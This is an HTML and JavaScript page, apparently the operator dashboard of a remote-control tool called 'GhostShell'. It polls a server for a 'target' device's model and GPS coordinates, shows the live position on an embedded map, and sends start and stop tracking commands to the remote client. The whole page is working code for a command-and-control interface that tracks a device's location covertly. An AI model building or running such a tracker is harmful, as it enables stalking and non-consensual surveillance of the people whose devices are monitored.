<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell Â· Live Tracker</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #050808;
            --surface: #0d1414;
            --accent: #00ffc3;
            --danger: #ff3b9e;
            --text: #dbdbdb;
            --glow: 0 0 15px rgba(0, 255, 195, 0.4);
        }

        body, html {
            margin: 0; padding: 0;
            background: var(--bg);
            color: var(--text);
            font-family: 'Segoe UI', monospace;
            height: 100vh; overflow: hidden;
        }

        #map-container {
            position: absolute; inset: 0;
            z-index: 1;
        }

        iframe {
            width: 100%; height: 100%; border: none;
            filter: grayscale(0.8) invert(0.9) contrast(1.2);
        }

        .overlay-ui {
            position: absolute; z-index: 10;
            pointer-events: none;
            inset: 0;
            display: flex; flex-direction: column;
            padding: 20px;
        }

        .panel {
            background: rgba(13, 20, 20, 0.85);
            backdrop-filter: blur(10px);
            border: 1px solid var(--accent);
            border-radius: 20px;
            padding: 15px;
            pointer-events: auto;
            box-shadow: var(--glow);
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px;
        }

        .header h1 {
            font-size: 1.2rem; margin: 0;
            background: linear-gradient(90deg, var(--accent), #fff);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .stats-panel {
            position: absolute; bottom: 30px; left: 20px;
            width: 300px;
        }

        .control-panel {
            position: absolute; bottom: 30px; right: 20px;
            display: flex; gap: 10px;
        }

        .coord-box {
            margin-top: 10px;
            font-size: 0.9rem;
            color: var(--accent);
            border-left: 3px solid var(--accent);
            padding-left: 10px;
        }

        button {
            padding: 12px 25px;
            border-radius: 50px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-start { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent); }
        .btn-stop { background: var(--danger); color: #fff; box-shadow: 0 0 10px var(--danger); display: none; }
        .btn-back { background: transparent; border: 1px solid #444; color: #888; margin-right: 10px; }

        .status-dot {
            width: 10px; height: 10px; border-radius: 50%;
            display: inline-block; margin-right: 5px;
        }
        .online { background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: pulse 1s infinite; }
        .offline { background: #555; }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.5); opacity: 0.5; }
            100% { transform: scale(1); opacity: 1; }
        }

        .compass-ui {
            position: absolute; top: 20px; right: 20px;
            font-size: 2rem; color: var(--accent);
            opacity: 0.5;
        }
    </style>
</head>
<body>
    <div id="map-container">
        <iframe id="map-frame" src="about:blank"></iframe>
    </div>

    <div class="overlay-ui">
        <div class="panel" style="width: fit-content;">
            <div class="header">
                <h1><i class="fas fa-satellite"></i> GHOSTSHELL TRACKER</h1>
            </div>
            <div id="target-info">
                <span id="status-dot" class="status-dot offline"></span>
                <span id="target-name">No Target Selected</span>
            </div>
        </div>

        <div class="compass-ui"><i class="fas fa-crosshairs"></i></div>

        <div class="panel stats-panel">
            <strong style="color: var(--accent);">SIGNAL STRENGTH: 100%</strong>
            <div class="coord-box">
                LAT: <span id="lat">0.0000</span><br>
                LON: <span id="lon">0.0000</span>
            </div>
            <div style="margin-top: 10px; font-size: 0.8rem; color: #666;">
                Status: <span id="status-text">Idle</span>
            </div>
        </div>

        <div class="control-panel">
            <button class="btn-back" onclick="location.href='/'">Back</button>
            <button id="start-btn" class="btn-start" onclick="toggleTracking(true)">Start Tracking</button>
            <button id="stop-btn" class="btn-stop" onclick="toggleTracking(false)">Stop Tracking</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const clientId = urlParams.get('client_id');
        let tracking = false;

        async function updateData() {
            if (!clientId) return;
            try {
                const res = await fetch(`/api/client_data/${clientId}`);
                const data = await res.json();
                
                document.getElementById('target-name').innerText = data.device_info?.Model || clientId;
                document.getElementById('status-dot').className = 'status-dot online';
                
                if (data.location_url) {
                    const coords = data.location_url.split('q=')[1].split(',');
                    document.getElementById('lat').innerText = coords[0];
                    document.getElementById('lon').innerText = coords[1];
                    
                    const mapUrl = `https://maps.google.com/maps?q=${coords[0]},${coords[1]}&z=17&output=embed`;
                    if (document.getElementById('map-frame').src !== mapUrl) {
                        document.getElementById('map-frame').src = mapUrl;
                    }
                }
                
                document.getElementById('status-text').innerText = data.location_status || 'Idle';
                
                // Update UI state based on server state
                if (data.tracking_active) {
                    showTrackingUI(true);
                } else {
                    showTrackingUI(false);
                }
            } catch (e) { console.error(e); }
        }

        function showTrackingUI(isActive) {
            tracking = isActive;
            document.getElementById('start-btn').style.display = isActive ? 'none' : 'block';
            document.getElementById('stop-btn').style.display = isActive ? 'block' : 'none';
        }

        async function toggleTracking(start) {
            const cmd = start ? 'start_tracking' : 'stop_tracking';
            try {
                await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cmd, client_id: clientId })
                });
                showTrackingUI(start);
            } catch (e) { console.error(e); }
        }

        setInterval(updateData, 2000);
        updateData();
    </script>
</body>
</html>
